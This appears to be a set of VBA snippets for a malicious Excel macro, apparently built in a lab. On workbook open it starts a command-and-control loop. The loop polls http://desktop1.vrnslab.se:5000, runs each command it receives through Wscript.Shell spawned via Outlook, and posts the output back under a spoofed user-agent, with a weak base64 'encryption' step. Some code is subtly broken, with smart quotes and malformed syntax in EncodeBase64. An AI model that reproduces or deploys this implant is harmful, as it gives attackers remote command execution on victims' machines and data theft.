```
'function for running commands on the victim
Function RunCommand (command As String) As String

	On Error GoTo error

	'create outlook object
	Set objOL = CreateObject("Outlook.Application")

	'create shell obj under the outlook object
	Set WshShell = objOL.CreateObject("Wscript.Shell")

	'execute command from shell object
	Set WshShellExec = WshShell.Exec(command)

	'read output of the command
	RunCommand = WshShellExec.StdOut.ReadAll

Done:
		Exit Function


error:		
		RunCommand = “Error”


End Function
```





```
'function for sending data to the c&c Server (not encrypted)
Function SendToServerEnc(data As String)
	Dim newString As String

	On Error GoTo error

	Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")

	Url = “http://desktop1.vrnslab.se:5000/enc”

	objHTTP.Open “POST”, Url, False

	objHTTP.setRequestHeader “User-Agent”, “Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)”

	objHTTP.send (data)

Done:
		Exit Function

error:
		MsgBox ("Cannot connect to Server")
		
End Function
```





```
Function encrypt(data As String)

	'First base64 to the data
	strOutput = EncodeBase64(data)

	'then add 1 to all char code
	For Counter = 1 To Len(strOutput)
		char = Mid(strOutput, Counter, 1)
		charCode = Asc(char)
		charCode = charCode + 1
		newString = newString + Chr(charCode)

	Next

	encrypt = newString

End Function
```





```
'function for sending data to the c&c Server (encrypted)
Function SendToServerEnc(data As String)
	Dim newString As String

	On Error GoTo error

	newString = encrypt(data)



	Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")

	Url = “http://desktop1.vrnslab.se:5000/enc”

	objHTTP.Open “POST”, Url, False

	objHTTP.setRequestHeader “User-Agent”, “Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)”

	objHTTP.send (newString)

Done:
		Exit Function

error:
		MsgBox ("Cannot connect to Server")
		
End Function
```





```
Function EncodeBase64(text$)
	Dim b
	With CreateObject("ADODB.Stream")
		.Open: .Type = 2: .Charset = “utf-8”
		.WriteText: text: .Position = 0: .Type - 1: b = .Read
		With CreateObject("Microsoft.XMLDOM") .createElement ("b64")
			.DataType = “bin.base64”: .nodeTypedValue = b
			EncodeBase64 = Replace(Mid)(.text, 5), vbLf, "")
		End With
		.Close
	End With
End Function
```





```
'function for sending data to the c&c Server
Function StartC2()
	Dim replyTXT As String

	On Error GoTo error

	data = “START”

	Do While replyTXT <> “STOP”

		Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
		'set the connect to IP and Port
		Url = “http://desktop1.vrnslab.se:5000”
		'send data as POST request
		objHTTP.Open “POST”, Url, False
		'set ua to look more like natural traffic
		objHTTP.setRequestHeader “User-Agent”, “Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)”
		'send the data
		objHTTP.send (data)

		'receive new command
		replyTXT = objHTTP.responseText

		'run new command
		data = RunCommand(replyTXT)

	'continue with loop
	Loop

Done:
		Exit Function

error:
		MsgBox ("Cannot connect to Server")

End Function
```





```
'opened when workbook is opened
Sub Workbook_Open()

	Dim strOutput As String
	
	StartC2
	
End Sub
```

